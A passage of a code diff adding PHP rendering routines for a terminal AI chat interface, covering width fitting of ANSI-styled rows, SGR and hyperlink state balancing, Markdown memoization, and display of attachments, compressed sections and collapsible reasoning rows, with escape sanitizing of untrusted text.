+     *
+     * WHY THIS BRANCH STILL EARNS ITS PLACE. A SECOND disagreement survives and
+     * it is not about clusters at all: `Width::of()` measures `Ansi::strip()`,
+     * which eats a two-byte ECMA-48 Fe escape (ESC-backslash, `ESC P`, `ESC M`)
+     * as zero cells, while `truncateAnsi()`'s scanner passes only `ESC [` and
+     * `ESC ]` and so reads that second byte as one VISIBLE cell. Round 40
+     * measured it at 548-668 over-runs per 400,000 calls, worst +1, and zero
+     * over-runs on any input free of an `ESC` + 0x40-0x5f pair. So this stays
+     * defended here, in the instrument the caller and the test both use.
+     *
+     * So: wrap, then MEASURE, and re-ask for a narrower wrap while the answer
+     * still does not fit. Re-asking rather than cutting is what keeps the
+     * CONTENT: 60 flags at cols=100 are accounted as 60 cells by the wrap and
+     * as 120 by the measure, so the first wrap returns the row whole; asking
+     * for 83, then 69, then 57, then 50 cells finally splits it into rows of
+     * exactly 100 measured cells with all 60 flags still on screen, where a cut
+     * at the first disagreement would have deleted 10 of them.
+     *
+     * Bounded, in two independent ways: the requested width strictly decreases
+     * every iteration (the scaled value is always smaller, and `- 1` is the
+     * floor if the arithmetic ever says otherwise), and {@see WRAP_RETRY_MAX}
+     * caps the attempts regardless. Whatever is still over budget after that is
+     * cut by {@see hardFit()} — the bound is never negotiable, only the content
+     * preserved on the way to it. Ordinary rows leave after the first wrap.
+     *
+     * @return list<string>
+     */
+    private static function wrapToPane(string $row, int $width): array
+    {
+        $target = $width;
+        $pieces = explode("\n", Width::wrapAnsi($row, $target));
+        $widest = self::widestOf($pieces);
+
+        for ($attempt = 0; $widest > $width && $target > 1 && $attempt < self::WRAP_RETRY_MAX; $attempt++) {
+            $scaled = intdiv($target * $width, $widest);
+            $target = max(1, $scaled < $target ? $scaled : $target - 1);
+            $pieces = explode("\n", Width::wrapAnsi($row, $target));
+            $widest = self::widestOf($pieces);
+        }
+
+        $out = [];
+        foreach ($pieces as $piece) {
+            $out[] = Width::of($piece) <= $width ? $piece : self::hardFit($piece, $width);
+        }
+
+        return $out;
+    }
+
+    /**
+     * Cut $row down until {@see Width::of()} — not `truncateAnsi()`'s own
+     * accounting — reads it as fitting $width.
+     *
+     * The loop exists because those two disagree (see {@see wrapToPane()} for
+     * the measurements): asking `truncateAnsi()` for $width cells can hand back
+     * 2 × $width of them. Each iteration lowers the request by the measured
+     * overshoot and never by less than one cell, so it terminates in a handful
+     * of steps and at worst at the empty string — a cut row, never an
+     * over-wide one.
+     */
+    private static function hardFit(string $row, int $width): string
+    {
+        if ($width <= 0) {
+            return '';
+        }
+
+        $target = $width;
+        $cut = Width::truncateAnsi($row, $target);
+        while ($target > 0 && Width::of($cut) > $width) {
+            $scaled = intdiv($target * $width, Width::of($cut));
+            $target = $scaled < $target ? $scaled : $target - 1;
+            $cut = Width::truncateAnsi($row, $target);
+        }
+
+        return $cut;
+    }
+
+    /**
+     * Hold every row of a post-choke-point block to $cols display cells by
+     * CUTTING. Named for the work it does, not for its first caller: the
+     * Veil overlays (E47) and the appended agent strip (E54) are BOTH blocks
+     * assembled after {@see fitToPane()} had its pass, and the standalone
+     * frame has no hosted clipWidth() underneath either.
+     *
+     * Deliberately not fitToPane(): that WRAPS, and a wrapped box row would
+     * add physical rows to a frame renderView() has already sized to $rows —
+     * re-opening the very row-collision this guard closes, one row lower. The
+     * trade mirrors the hosted path's clipWidth(): a cut row costs a too
+     * narrow terminal the overlay's right border; a wrapped row costs every
+     * row under the wrap its coordinates.
+     *
+     * Rows that already fit are returned byte-identical, so a terminal wide
+     * enough for the box sees no change at all. No balanceSgr() pass: this
+     * guard runs on every overlay frame and would rewrite bytes on rows it did
+     * not touch (fitToPane() balances because it wraps); a row hardFit() cuts
+     * may end with an open style — the same exposure that row had before this
+     * guard existed, and unchanged for every other row.
+     *
+     * Callers clip BEFORE marking zones: the overlay strings carry no zone
+     * sentinels at this point (the palette's item zones are marked on the
+     * COMPOSITED frame, after this call), and {@see renderAgentView()} keeps
+     * the same order for its `pane:agents` header so hardFit() can never clip
+     * a sentinel triple in half here.
+     */
+    private static function clipRowsToCols(string $block, int $cols): string
+    {
+        if ($cols <= 0) {
+            return $block;
+        }
+
+        $rows = explode("\n", $block);
+        foreach ($rows as $index => $row) {
+            if (Width::of($row) > $cols) {
+                $rows[$index] = self::hardFit($row, $cols);
+            }
+        }
+
+        return implode("\n", $rows);
+    }
+
+    /**
+     * {@see clipRowsToCols()} for a finished frame that may already carry zone
+     * sentinels: a row that has to be cut loses its sentinels first, so the
+     * cut cannot land between an open and a close marker. Every zone this
+     * renderer marks is single-row, so stripping a whole row removes whole
+     * pairs and the other rows' zones still parse. Rows that fit are returned
+     * byte-identical, sentinels included.
+     */
+    private static function clipFrameToCols(string $frame, int $cols): string
+    {
+        $rows = explode("\n", $frame);
+        foreach ($rows as $index => $row) {
+            $visible = self::stripZoneMarkers($row);
+            if (Width::of($visible) > $cols) {
+                $rows[$index] = self::hardFit($visible, $cols);
+            }
+        }
+
+        return implode("\n", $rows);
+    }
+
+    /** @param list<string> $rows */
+    private static function widestOf(array $rows): int
+    {
+        $widest = 0;
+        foreach ($rows as $row) {
+            $widest = max($widest, Width::of($row));
+        }
+
+        return $widest;
+    }
+
+    /**
+     * Does $row carry the head of a tool row THIS frame emitted?
+     *
+     * Keyed off {@see $toolRowHeads}, which is recorded unconditionally, and
+     * NOT off {@see $toolCallZones}. An earlier revision of this method read
+     * the click registry and claimed the two "cannot disagree" — they can and
+     * they did: {@see recordToolCallZone()} deliberately records nothing when
+     * {@see Chat::mouseClicksEnabled()} is false or when the model-supplied id
+     * is outside {@see ZONE_ID_CHARSET}, and in those states this returned
+     * false and the tool row was WRAPPED. Measured with clicks off at 20
+     * columns: `🔧 tool: B ⊘` followed by a lookalike `interrupted` row, which
+     * is precisely the outcome {@see fitToPane()}'s tool-row branch exists to
+     * prevent. Matched by `str_contains()` the same way
+     * {@see markToolCalls()} matches, so where a zone IS recorded the row this
+     * truncates and the row that gets marked are the same row.
+     */
+    private static function isToolCallRow(string $row): bool
+    {
+        foreach (self::$toolRowHeads as $head) {
+            if (str_contains($row, $head)) {
+                return true;
+            }
+        }
+
+        return false;
+    }
+
+    /**
+     * Re-balance the SGR (and OSC 8 hyperlink) state of a block of rows so each
+     * row opens with the styling it inherits and closes what it opened.
+     *
+     * {@see Width::wrapAnsi()} preserves escapes but not their balance: it
+     * documents that "a colour set on line N stays active on line N+1 (no SGR
+     * reset is auto-emitted)", and SugarMarkdown's own paragraph wrap leaves the
+     * same thing behind. That is fine for a stream written top to bottom and
+     * wrong for this renderer, because sugar-core repaints only the rows that
+     * CHANGED — a middle line of a wrapped block, repainted alone, would
+     * inherit whatever styling happened to be active on the wire instead of
+     * its own, and a row left with an open SGR bleeds its colour into the
+     * `eraseLine()` of whatever is painted next.
+     *
+     * The state is carried across the whole block, not recomputed per line,
+     * which is why this takes the list rather than one line at a time.
+     * {@see SgrState} is sugar-core's own tracker — the one its cell-diff
+     * resumes partial repaints with — so "balanced" here means the same thing
+     * it means there.
+     *
+     * OSC 8 hyperlinks ride the same boundary: SugarMarkdown renders a
+     * markdown link as OSC 8, so once the label became wrappable (which
+     * the width thread-through is what made happen) a row could open a
+     * link and end without closing it — measured at cols=60, row 3
+     * opened `ESC]8;;https://example.com/x` and only row 4 carried the
+     * close. Painted alone by the changed-rows-only diff, that row makes
+     * every later cell part of the link in iTerm2, WezTerm, VTE and
+     * Kitty. E667 closed the seam this used to work around: the open URI
+     * is re-emitted in the next row's prefix and closed at the end of
+     * any row that ends inside a link by {@see SgrState::rowOpen()} /
+     * {@see SgrState::rowClose()} — one contract owned by the same class
+     * the cell-diff resumes partial repaints with, and no private
+     * tracker here. SGR 58 (underline colour) is likewise tracked by
+     * SgrState since E50.
+     *
+     * A row that inherits nothing and leaves nothing open is returned
+     * byte-identical — `toPrefix()` is empty in the default state and neither
+     * suffix is emitted — which is what keeps the image-marker rows
+     * {@see fitToPane()} documents intact.
+     *
+     * @param  list<string> $rows
+     * @return list<string>
+     */
+    private static function balanceSgr(array $rows): array
+    {
+        // $state is never changed in place: it may be a snapshot shared with
+        // $styleTokenMemo, so a row that changes it works on a clone.
+        $initial = self::initialSgrState();
+        $state = $initial;
+        // Null until a row ends inside an unfinished escape. See below.
+        $parser = null;
+        $out = [];
+        foreach ($rows as $row) {
+            if ($parser !== null) {
+                $prefix = $state->rowOpen();
+                $state = clone $state;
+                foreach ($parser->parse($row) as $token) {
+                    $state->apply($token);
+                }
+                $out[] = $prefix . $row . $state->rowClose();
+
+                continue;
+            }
+
+            $entry = self::styleTokens($row);
+            // `==` compares every property of the two states, which is exact.
+            // SgrState's own predicates are not: isDefault() ignores the
+            // underline colour and an open hyperlink.
+            if ($state == $initial) {
+                // Most rows start unstyled, so for them the whole row (state
+                // after it, closing bytes) is memoized too.
+                $prefix = '';
+                $state = $entry[2];
+                $close = $entry[3];
+            } else {
+                $prefix = $state->rowOpen();
+                if ($entry[0] !== []) {
+                    $state = clone $state;
+                    foreach ($entry[0] as $token) {
+                        $state->apply($token);
+                    }
+                }
+                $close = $state->rowClose();
+            }
+            if ($entry[1]) {
+                // A Parser keeps an escape cut off at the end of one row and
+                // joins it to the next row. A per-row token list cannot do
+                // that, so from this row on the block goes through one shared
+                // Parser, primed with this row so that it holds the same
+                // unfinished bytes. This is the pre-memo algorithm.
+                $parser = new Parser();
+                $parser->parse($row);
+            }
+            $out[] = $prefix . $row . $close;
+        }
+
+        return $out;
+    }
+
+    /**
+     * Everything {@see balanceSgr()} needs to know about one row, memoized per
+     * row in {@see $styleTokenMemo} (audit 15b-10):
+     *  0. the row's tokens that can change an {@see SgrState} (SGR and OSC;
+     *     {@see SgrState::apply()} ignores text and control tokens);
+     *  1. whether the row ends inside an unfinished escape;
+     *  2. the state after the row, starting from the initial state;
+     *  3. that state's {@see SgrState::rowClose()}.
+     *
+     * balanceSgr() runs over the whole transcript on every frame. Once the
+     * Markdown was memoized, tokenizing every row byte by byte and replaying
+     * the tokens took most of the frame: 280 ms of 380 ms at 200 exchanges.
+     * A transcript is mostly the same rows frame after frame. A fresh Parser
+     * tokenizes a row the same way the shared one did, as long as the shared
+     * one held no unfinished escape when the row started, and balanceSgr()
+     * keeps that condition.
+     *
+     * @return array{0: list<Token>, 1: bool, 2: SgrState, 3: string}
+     */
+    private static function styleTokens(string $row): array
+    {
+        if (!str_contains($row, "\x1b")) {
+            // Only ESC starts a sequence for the Parser, so the row is text.
+            return self::$plainRow ??= [[], false, self::initialSgrState(), ''];
+        }
+        if (isset(self::$styleTokenMemo[$row])) {
+            return self::$styleTokenMemo[$row];
+        }
+
+        $parser = new Parser();
+        $tokens = [];
+        foreach ($parser->parse($row) as $token) {
+            if ($token->type === Token::OSC || ($token->type === Token::CSI && $token->final === 'm')) {
+                $tokens[] = $token;
+            }
+        }
+        $after = SgrState::initial();
+        foreach ($tokens as $token) {
+            $after->apply($token);
+        }
+        $entry = [$tokens, $parser->flush() !== [], $after, $after->rowClose()];
+
+        if (\count(self::$styleTokenMemo) >= self::STYLE_TOKEN_MEMO_MAX) {
+            // Drop the older half rather than one entry per insert: fewer
+            // rebuilds, and the rows the frame is reading now survive.
+            self::$styleTokenMemo = \array_slice(self::$styleTokenMemo, self::STYLE_TOKEN_MEMO_MAX >> 1, null, true);
+        }
+
+        return self::$styleTokenMemo[$row] = $entry;
+    }
+
+    /**
+     * One shared initial {@see SgrState}. Never changed: {@see balanceSgr()}
+     * clones before it applies a token.
+     */
+    private static function initialSgrState(): SgrState
+    {
+        return self::$initialSgrState ??= SgrState::initial();
+    }
+
+    /**
+     * @param  list<Message>       $history
+     * @param int                 $width     usable columns inside the shell's border +
+     *                                       padding, so nested boxes (tool diffs) can
+     *                                       truncate rather than wrap into a second row
+     * @param array<string, bool> $expanded  {@see Chat::expanded()} - tool-call ids the
+     *                                       user has expanded, keyed by id
+     * @param ImageLayer          $images    this frame's pixel-graphics layer, threaded
+     *                                       down to {@see renderToolImage()}
+     * @param Mosaic|null         $mosaic    the probe-once terminal image capability off
+     *                                       {@see Chat::mosaic()}; null disables images
+     * @param int                 $imageRows tallest cell box a single tool image may
+     *                                       be encoded at, see {@see renderToolImage()}
+     * @param \SugarCraft\Code\Agents\Live\AgentLiveRegistry|null $agents the delegated runs' live state
+     *                                       ({@see Chat::agentLive()}), for the line
+     *                                       under each Task row; null draws none
+     * @param \SugarCraft\Code\Context\Pruning\ContextLedger|null $ledger the session's context
+     *                                       ledger (roadmap 3.B-3): a tool row whose
+     *                                       output the model is no longer sent wears a
+     *                                       `pruned` / `distilled` badge; null draws none
+     */
+    private static function renderHistory(array $history, Theme $theme, int $width, array $expanded, ImageLayer $images, ?Mosaic $mosaic, int $imageRows, ?\SugarCraft\Code\Agents\Live\AgentLiveRegistry $agents = null, ?\SugarCraft\Code\Context\Pruning\ContextLedger $ledger = null): string
+    {
+        // Roadmap 1.B-2: a row the model reads but the user does not - a
+        // turn's step record ({@see Message::$userVisible}) - is not painted.
+        // Roadmap 3.B-4: where each section the model compressed starts, read
+        // off the WHOLE history — a step's opening row is a hidden one.
+        $sections = $ledger === null ? [] : self::compressedSectionStarts($history, $ledger);
+        $history = array_filter($history, static fn(Message $msg): bool => $msg->userVisible);
+        if ($history === []) {
+            return '_(' . Lang::t('tui.chat.empty_conversation') . ')_';
+        }
+        // The one argument this call used to omit, and the whole reason a
+        // 200-column reply rendered as a 200-column ROW in a 100-column
+        // terminal: SugarMarkdown's word wrap is opt-in and off by default
+        // (`SugarCraft\Markdown\Renderer::__construct()` nulls a non-positive
+        // width), so with no width every paragraph came out on one line.
+        $md = new Markdown($theme->markdown, wrapWidth: $width);
+        // Built once per frame, not once per turn: the labels depend only on
+        // the theme, and styling them per turn was a fixed cost on every row
+        // of a long transcript (audit 15b-10).
+        $userLabel = Style::new()->foreground($theme->userLabel)->bold()->render(Lang::t('tui.chat.user_label'));
+        $assistantLabel = Style::new()->foreground($theme->assistantLabel)->bold()->render(Lang::t('tui.chat.assistant_label'));
+        // Roadmap 1.B-3: compaction hides the rows it condensed from the model
+        // and leaves them here, with a boundary row where they end
+        // ({@see Chat::COMPACTION_BOUNDARY}). The boundary is painted as a rule
+        // across the pane, and every turn above the NEWEST one wears dim
+        // labels: the model reads only a summary of it. Only the labels, not the
+        // body - the body is Markdown carrying its own SGR, which an outer
+        // faint wrapper would not survive past its first reset.
+        $lastBoundary = null;
+        foreach ($history as $key => $msg) {
+            if (Chat::isCompactionBoundary($msg)) {
+                $lastBoundary = $key;
+            }
+        }
+        $condensedUserLabel = self::dim($theme)->render(Lang::t('tui.chat.user_label'));
+        $condensedAssistantLabel = self::dim($theme)->render(Lang::t('tui.chat.assistant_label'));
+        // The rule is one row clipped to the pane, never wrapped: it marks a
+        // place, and a second row would be a row it does not own.
+        $boundaryRule = self::dim($theme)->render(Width::truncate(
+            '── ' . Lang::t('tui.chat.compaction_boundary') . ' '
+                . str_repeat('─', max(0, $width)),
+            max(1, $width),
+        ));
+        $blocks = [];
+        foreach ($history as $key => $msg) {
+            // Roadmap 3.B-4: a section the model compressed is marked above
+            // its first row — the person still reads every row; the model
+            // reads the block's summary in their place.
+            foreach ($sections as $start => $starting) {
+                if ($start > $key) {
+                    break;
+                }
+                foreach ($starting as $section) {
+                    $blocks[] = self::compressedSectionRow($section, $theme, $width);
+                }
+                unset($sections[$start]);
+            }
+            if (Chat::isCompactionBoundary($msg)) {
+                $blocks[] = $boundaryRule;
+
+                continue;
+            }
+            $condensed = $lastBoundary !== null && $key < $lastBoundary;
+            // Defense-in-depth (sugar-cellbuffer #1362): User and System content is
+            // untrusted and reaches the terminal wire verbatim. A raw ESC would
+            // desync the frame-diff line model or forge SGR that escapes the
+            // renderer's own styling (e.g. a smuggled reset() breaking out of the
+            // system FAINT wrapper); NUL/BEL/DEL garble or beep the terminal.
+            // These turns are plain text with no legitimate SGR, so untrusted()
+            // (full ANSI + C0/DEL/lone-C1 strip) is correct — the Assistant path
+            // stays raw because SugarMarkdown emits legitimate, already-processed SGR.
+            if ($msg->toolResults !== []) {
+                $blocks[] = self::renderToolResults($msg, $theme, $width, $expanded, $images, $mosaic, $imageRows, $agents, $ledger);
+
+                continue;
+            }
+            if ($msg->pendingToolCallId !== null) {
+                $blocks[] = self::renderPendingToolCall($msg, $theme, $expanded, $width, $agents, $images, $mosaic, $imageRows);
+
+                continue;
+            }
+            $blocks[] = match ($msg->role) {
+                Role::User      => ($condensed ? $condensedUserLabel : $userLabel) . " " . self::untrusted($msg->content)
+                    . self::attachmentChip($msg, $theme, $width),
+                Role::Assistant => self::renderAssistantTurn($msg, $theme, $md, $width, $condensed ? $condensedAssistantLabel : $assistantLabel, $expanded),
+                Role::System    => $msg->uiOnly
+                    ? self::notice($theme)->render(Lang::t(self::NOTICE_ROW_LABEL) . ' ' . self::untrusted($msg->content))
+                    : self::dim($theme)->render(Lang::t('tui.chat.system_label') . ' ' . self::untrusted($msg->content)),
+            };
+        }
+        return implode("\n\n", $blocks);
+    }
+
+    /**
+     * Each active section the model compressed (roadmap 3.B-4), by the index
+     * in $history of the row it starts at, in order: a prompt by its bytes and
+     * occurrence ({@see \SugarCraft\Code\Context\Pruning\ContextLedger::userRowKey()}),
+     * a step by the row that issued or answered its first call. A section
+     * whose first row is gone is not marked.
+     *
+     * @param array<int, Message> $history
+     * @return array<int, list<\SugarCraft\Code\Context\Pruning\CompressionBlock>>
+     */
+    private static function compressedSectionStarts(array $history, \SugarCraft\Code\Context\Pruning\ContextLedger $ledger): array
+    {
+        $ranges = $ledger->activeRangeBlocks();
+        if ($ranges === []) {
+            return [];
+        }
+        $prompts = [];
+        $calls = [];
+        $seen = [];
+        foreach ($history as $index => $row) {
+            if ($row->role === Role::User && !$row->uiOnly && !\SugarCraft\Code\Context\TurnContextBlock::isTurnContext($row)) {
+                $occurrence = $seen[$row->content] = ($seen[$row->content] ?? 0) + 1;
+                $prompts[\SugarCraft\Code\Context\Pruning\ContextLedger::userRowKey($row->content, $occurrence)] ??= $index;
+            }
+            foreach ($row->toolCalls as $call) {
+                if ($call instanceof \SugarCraft\Code\ToolCall && $call->id !== null) {
+                    $calls['s:' . $call->id] ??= $index;
+                }
+            }
+            foreach ($row->toolResults as $result) {
+                if ($result instanceof \SugarCraft\Code\ToolResult && $result->id !== null) {
+                    $calls['s:' . $result->id] ??= $index;
+                }
+            }
+        }
+
+        $starts = [];
+        foreach ($ranges as $block) {
+            $index = $prompts[(string) $block->fromKey] ?? $calls[(string) $block->fromKey] ?? null;
+            if ($index !== null) {
+                $starts[$index][] = $block;
+            }
+        }
+        ksort($starts);
+
+        return $starts;
+    }
+
+    /**
+     * `▣ Compressed b3 · Auth system exploration · −41.0K +2.4K` — one dim
+     * row, clipped to the pane, never wrapped.
+     */
+    private static function compressedSectionRow(\SugarCraft\Code\Context\Pruning\CompressionBlock $block, Theme $theme, int $width): string
+    {
+        return self::dim($theme)->render(Width::truncate(
+            '▣ ' . Lang::t('tui.chat.compressed_section', [
+                'label' => $block->label(),
+                'topic' => self::oneLine((string) $block->topic),
+                'removed' => \SugarCraft\Code\Util\TokenCount::compact($block->compressedTokens),
+                'added' => \SugarCraft\Code\Util\TokenCount::compact($block->summaryTokens),
+            ]),
+            max(1, $width),
+        ));
+    }
+
+    /**
+     * The row under a user turn naming what it attached (audit 15b-15):
+     * `📎 Chat.php · 🖼 shot.png`, or '' when it attached nothing.
+     *
+     * ONE ROW, CLIPPED, never wrapped: names come from user-typed paths and a
+     * screenshot dir can make them long, and a chip that wrapped would push
+     * the transcript by rows it does not own. Clipped to the pane width with
+     * the same `max(1, …)` floor every modal and table row takes (audit R4),
+     * so a 1-column pane still gets a one-cell chip rather than an over-wide
+     * row. Each name is folded to one sanitised line first ({@see oneLine()}):
+     * a path is user input and may carry anything a filename can.
+     */
+    private static function attachmentChip(Message $msg, Theme $theme, int $width): string
+    {
+        if ($msg->attachments === []) {
+            return '';
+        }
+
+        $names = [];
+        foreach ($msg->attachments as $attachment) {
+            if (!$attachment instanceof \SugarCraft\Code\Attachment) {
+                continue;
+            }
+            // A skill mention names itself: every skill file is SKILL.md, so the
+            // basename said nothing (lane B, skills-qa F2). Non-skill chips — and
+            // snapshots persisted before the field — keep the basename byte for
+            // byte ({@see \SugarCraft\Code\Tests\Renderer\AttachmentChipTest}).
+            $names[] = ($attachment->type === \SugarCraft\Code\AttachmentType::Image ? '🖼 ' : '')
+                . ($attachment->skill === null
+                    ? self::oneLine($attachment->name())
+                    : self::oneLine(Lang::t('tui.skills.row_label') . ' ' . $attachment->skill));
+        }
+        if ($names === []) {
+            return '';
+        }
+
+        // The paperclip is two cells, so a one-cell pane cannot hold even it;
+        // that pane still gets a mark rather than a blank row it cannot read.
+        $chip = Width::truncate('📎 ' . implode(' · ', $names), max(1, $width));
+
+        return "\n" . self::dim($theme)->render($chip === '' ? '…' : $chip);
+    }
+
+    /**
+     * An assistant turn's label + (when present) its {@see Message::$reasoning}
+     * as a collapsible "💭 Thought" row ({@see renderThought()}) + rendered
+     * Markdown body. §12 D3's final wiring step - the extractor already splits
+     * reasoning out at the provider layer and
+     * {@see \SugarCraft\Code\Backend\EngineBackend} threads it onto the root
+     * {@see Message} DTO; this is where it actually reaches the user instead
+     * of being computed and discarded.
+     *
+     * @param Markdown            $md       renderer built from `$theme->markdown` at $width
+     * @param string              $label    the styled `assistant` label
+     * @param array<string, bool> $expanded {@see Chat::expanded()}
+     */
+    private static function renderAssistantTurn(Message $msg, Theme $theme, Markdown $md, int $width, string $label, array $expanded = []): string
+    {
+        // Sentinels stripped BEFORE SugarMarkdown, not after: the rendered output
+        // is legitimate SGR that untrusted() would destroy, but the model's
+        // raw text can still smuggle U+E000/U+E001 into the frame.
+        $body = self::settledMarkdown($md, $theme, $width, Sanitize::stripZoneSentinels($msg->content));
+
+        if ($msg->reasoning === null || trim($msg->reasoning) === '') {
+            return $label . "\n" . $body;
+        }
+
+        $thought = self::renderThought($msg->reasoning, $theme, $expanded, self::thoughtKey($msg->reasoning));
+
+        return $label . "\n" . $thought . ($body === '' ? '' : "\n" . $body);
+    }
+
+    /**
+     * The in-flight reply as far as it has arrived, painted with the same
+     * label and Markdown treatment a settled assistant turn gets - so the
+     * moment the turn lands, the text does not visibly re-flow into a
+     * different shape.
+     *
+     * Markdown rendering is guarded, which {@see renderAssistantTurn()} does
+     * not need to be: a partial reply is a genuinely different input class -
+     * an unterminated code fence, a half-written table row, a lone `[` - and
+     * every frame of a streaming turn feeds one to the parser. A renderer
+     * exception here would take down the whole TUI mid-answer, so a partial
+     * that cannot be parsed yet is shown as plain (sanitized) text until the
+     * next chunk completes the construct. Untrusted-stripped in that fallback
+     * because SugarMarkdown is what normally neutralises raw model output.
+     *
+     * @param int $width pane columns the partial is word-wrapped to. Threaded in
+     *                   rather than defaulted for the same reason the settled
+     *                   turn's is: without it a streaming reply paints one
+     *                   over-wide row per paragraph for the whole duration of
+     *                   the turn and then silently re-flows the moment the turn
+     *                   lands - precisely the shape change the paragraph above
+     *                   promises does not happen.
+     */
+    private static function renderStreamingTurn(string $partial, Theme $theme, int $width): string
+    {
+        $label = Style::new()->foreground($theme->assistantLabel)->bold()->render('assistant');
+        // Sentinels stripped BEFORE the renderer, same order and reason as
+        // renderAssistantTurn(): the model's raw text can smuggle
+        // U+E000/U+E001 into the frame and break the mouse-zone scan.
+        $raw = Sanitize::stripZoneSentinels($partial);
+        $md = new Markdown($theme->markdown, wrapWidth: $width);
+
+        try {
+            $body = rtrim(self::streamingMarkdown($md, $theme, $width, $raw));
+        } catch (\Throwable) {
+            // The incremental path parses sections, the old path parsed the
+            // whole partial, and only the whole-partial outcome is the
+            // contract: retry it before falling back to plain text.
+            try {
+                $body = rtrim($md->render($raw));
+            } catch (\Throwable) {
+                $body = self::untrusted($raw);
+            }
+        }
+
+        return $label . "\n" . $body;
+    }
+
+    /**
+     * `trim($md->render($source))`, memoized in {@see $markdownMemo}.
+     *
+     * $md must be a renderer built from `$theme->markdown` at $width, which
+     * is the only kind {@see renderHistory()} builds.
+     */
+    private static function settledMarkdown(Markdown $md, Theme $theme, int $width, string $source): string
+    {
+        if (self::$markdownMemoTheme?->get() !== $theme->markdown) {
+            self::$markdownMemo = [];
+            self::$markdownMemoTheme = \WeakReference::create($theme->markdown);
+        }
+
+        // Length plus a 128-bit hash, so a key costs O(1) memory per turn
+        // however long the reply is.
+        $key = $width . ':' . strlen($source) . ':' . hash('xxh128', $source);
+        if (isset(self::$markdownMemo[$key])) {
+            $hit = self::$markdownMemo[$key];
+            // Move to the most-recently-used end.
+            unset(self::$markdownMemo[$key]);
+
+            return self::$markdownMemo[$key] = $hit;
+        }
+
+        $body = trim($md->render($source));
+        self::$markdownMemo[$key] = $body;
+        if (\count(self::$markdownMemo) > self::MARKDOWN_MEMO_MAX) {
+            unset(self::$markdownMemo[array_key_first(self::$markdownMemo)]);
+        }
+
+        return $body;
+    }
+
+    /**
+     * The streaming partial rendered to the same bytes as `$md->render($raw)`
+     * (up to trailing whitespace, which the caller trims), but incrementally
+     * through {@see $streamMemo}.
+     *
+     * Falls back to a whole render when the renderer's document-scope
+     * decoration makes sections unsafe ({@see Markdown::defersStreaming()}).
+     *
+     * The tail is a long reply with no section boundary yet, such as one
+     * huge code block. It is rendered whole on each frame whose partial
+     * grew; a frame whose partial is unchanged (an idle repaint tick) reads
+     * the cached tail. Only the sections before it are saved regardless.
+     */
+    private static function streamingMarkdown(Markdown $md, Theme $theme, int $width, string $raw): string
+    {
+        if ($md->defersStreaming()) {
+            self::$streamMemo = null;
+
+            return $md->render($raw);
+        }
+
+        $memo = self::$streamMemo;
+        if (
+            $memo === null
+            || $memo['theme']->get() !== $theme->markdown
+            || $memo['width'] !== $width
+            || !str_starts_with($raw, $memo['consumed'])
+        ) {
+            $memo = [
+                'theme' => \WeakReference::create($theme->markdown),
+                'width' => $width,
+                'consumed' => '',
+                'stream' => new SectionStream($md),
+                'bodies' => '',
+                'preview' => null,
+            ];
+        }
+        // Cleared first: the stream is mutated in place below, so a render
+        // that throws part-way must not leave a state whose stream is ahead
+        // of its bodies.
+        self::$streamMemo = null;
+
+        $delta = substr($raw, strlen($memo['consumed']));
+        if ($delta !== '') {
+            // One line per push(). The scanner keeps an unconsumed buffer and
+            // re-slices it once per newline, so a 200 KB first frame pushed in
+            // one piece would copy the buffer once per line, which is
+            // quadratic. Its state depends only on the bytes assembled so far,
+            // so how the delta is split does not change the sections.
+            foreach (preg_split('/(?<=\n)/', $delta, -1, PREG_SPLIT_NO_EMPTY) ?: [] as $piece) {
+                foreach ($memo['stream']->push($piece) as $body) {
+                    $memo['bodies'] .= $body;
+                }
+            }
+            $memo['consumed'] = $raw;
+        }
+
+        // Saved before the tail is rendered: the state is complete here, and a
+        // tail the parser rejects (a partial cut inside a UTF-8 sequence) must
+        // not cost the next frame every section again. The tail is rendered
+        // from a clone, because finish() ends a stream and this one is fed
+        // again next frame.
+        self::$streamMemo = $memo;
+
+        // Unchanged partial (an idle repaint tick between token batches): the
+        // preview cached for these exact bytes IS this frame's answer.
+        $preview = $memo['preview'];
+        if ($preview === null || $preview['src'] !== $memo['consumed']) {
+            $preview = ['src' => $memo['consumed'], 'out' => implode('', (clone $memo['stream'])->finish())];
+            self::$streamMemo['preview'] = $preview;
+        }
+
+        return $memo['bodies'] . $preview['out'];
+    }
+
+    /**
+     * The {@see Chat::expanded()} key of a settled thought: derived from the
+     * text alone, so the running placeholder a thought rides on and the
+     * finished row that replaces it (a new {@see Message}, new timestamp)
+     * resolve to the same open/closed state.
+     */
+    public static function thoughtKey(string $reasoning): string
+    {
+        return 'thought.' . substr(sha1($reasoning), 0, 16);
+    }
+
+    /**
+     * A model's thinking as ONE collapsible row (crush_feat.md §12 D3's
+     * "dimmed/collapsed"): `💭 Thought ▸ 42 lines · click to expand` until
+     * the user opens it, then the same row flipped to `▾` with the whole
+     * trace below it, newlines kept. Clicking the row again closes it.
+     *
+     * The row is a click zone on the SAME registry and key space tool rows
+     * use ({@see recordToolCallZone()}, {@see Chat::toggleToolOutput()}), so
+     * no second expansion mechanism can disagree with the first. Its head is
+     * also recorded in {@see $toolRowHeads}, which makes {@see fitToPane()}
+     * truncate the row rather than wrap it - a wrapped head would split the
+     * one-line zone.
+     *
+     * Reasoning is raw model output that never passes through SugarMarkdown, so
+     * every line is {@see untrusted()}-scrubbed before display.
+     *
+     * @param array<string, bool> $expanded {@see Chat::expanded()}
+     */
+    private static function renderThought(string $reasoning, Theme $theme, array $expanded, string $key): string
+    {
+        $lines = self::thoughtLines($reasoning);
+        $isExpanded = ($expanded[$key] ?? false) === true;
+        $faint = self::dim($theme);
+
+        $head = self::dim($theme)->italic()->render('💭 ' . Lang::t(self::THOUGHT_ROW_LABEL));
+        self::$toolRowHeads[] = $head;
+        self::recordToolCallZone($key, $head);
+
+        $count = count($lines);
+        $size = Lang::t($count === 1 ? 'tui.chat.line_one' : 'tui.chat.lines', ['count' => $count]);
+        // The chord is offered on the collapsed row Ctrl+O actually opens, and
+        // only there: it reaches the newest thought alone, so promising it on
+        // an older row would be a hint that does nothing.
+        $clicks = Chat::mouseClicksEnabled();
+        $ctrlO = !$isExpanded && $key === self::$ctrlOThoughtKey;
+        $hint = match (true) {
+            $isExpanded => $clicks ? ' · ' . Lang::t('tui.chat.click_collapse') : '',
+            $ctrlO      => ' · ' . Lang::t($clicks ? 'tui.chat.click_or_ctrl_o_expand' : 'tui.chat.ctrl_o_expand'),
+            default     => $clicks ? ' · ' . Lang::t('tui.chat.click_expand') : '',
+        };
+        $row = $head . $faint->render(($isExpanded ? ' ▾ ' : ' ▸ ') . $size . $hint);
+
+        if (!$isExpanded) {
